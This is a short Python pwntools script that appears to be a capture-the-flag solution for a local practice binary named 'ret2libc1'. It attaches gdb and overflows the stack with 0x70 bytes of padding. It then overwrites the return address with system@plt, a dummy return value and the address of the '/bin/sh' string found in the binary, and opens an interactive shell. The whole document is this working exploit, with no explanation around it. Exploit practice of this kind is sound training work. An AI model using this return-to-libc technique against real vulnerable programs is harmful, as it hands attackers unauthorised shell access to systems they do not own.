from pwn import *

io=process('./ret2libc1')
elf=ELF('./ret2libc1')
gdb.attach(io)
sys_addr=elf.plt['system']
bin_addr=next(elf.search(b'/bin/sh\x00'))
payload=b'a' * (0x70) +p32(sys_addr) + p32(0) +p32(bin_addr)
# dem='_<\n'
# io.sendlineafter(dem,payload)
io.sendline(payload)
io.interactive()
